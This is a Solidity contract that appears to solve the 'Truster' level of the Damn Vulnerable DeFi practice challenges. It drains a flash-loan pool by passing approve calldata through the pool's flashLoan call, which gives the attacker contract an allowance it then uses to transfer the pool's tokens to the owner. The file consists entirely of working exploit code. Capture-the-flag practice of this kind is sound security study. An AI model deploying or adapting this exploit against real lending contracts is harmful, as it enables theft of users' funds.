pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract AttackTruster {

    address private immutable owner;
    IERC20 public immutable damnValuableToken;
    TrusterLenderPool public immutable trusterContract;

    uint256 private drainerNumber = 1_000_000 * 10 ** 18;

    constructor (address tokenAddress, address poolAddress) {
        owner = msg.sender;
        damnValuableToken = IERC20(tokenAddress);
        trusterContract = TrusterLenderPool(poolAddress);
    }

    // 1. call flashLoan with: approve DVT callData
    // then, transferFrom()

    function PoolDrainer() public {
        require(damnValuableToken.balanceOf(address(trusterContract)) > 0, "contract is empty");

        bytes memory callData = abi.encodeWithSignature("approve(address,uint256)", address(this), drainerNumber);

        trusterContract.flashLoan(0, address(this), address(damnValuableToken), callData);

    }

    function TransferFromPool(uint256 amount) external returns (bool) {
        if(msg.sender != owner) { revert("Only owner!");}
        return damnValuableToken.transferFrom(address(trusterContract), owner, amount);
    }


}